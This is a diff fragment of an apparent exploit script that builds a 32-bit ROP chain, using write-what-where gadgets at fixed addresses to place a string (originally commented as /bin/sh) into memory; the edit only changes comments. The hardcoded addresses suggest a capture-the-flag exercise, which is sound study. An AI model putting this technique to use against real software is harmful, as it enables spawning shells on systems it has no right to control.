@@ -27,22 +27,22 @@ buf += what1 # first 4 bytes written here
 buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;
 
 buf += p32(0x080486da) # pop edi; pop ebp; ret;
-buf += where2 # next 4 bytes of string /bin/sh, ends up in edi
+buf += where2 # next 4 bytes of string, ends up in edi
 buf += what2 # next 4 bytes written here
 buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;
 
 buf += p32(0x080486da) # pop edi; pop ebp; ret;
-buf += where3 # next 4 bytes of string /bin/sh, ends up in edi
+buf += where3 # next 4 bytes of string, ends up in edi
 buf += what3 # next 4 bytes written here
 buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;
 
 buf += p32(0x080486da) # pop edi; pop ebp; ret;
-buf += where4 # next 4 bytes of string /bin/sh, ends up in edi
+buf += where4 # next 4 bytes of string, ends up in edi
 buf += what4 # next 4 bytes written here
 buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;
 
 buf += p32(0x080486da) # pop edi; pop ebp; ret;
-buf += where5 # next 4 bytes of string /bin/sh, ends up in edi
+buf += where5 # next 4 bytes of string, ends up in edi
 buf += what5 # next 4 bytes written here
 buf += p32(0x08048670) # gadget = move dword ptr [edi], ebp; ret;
 
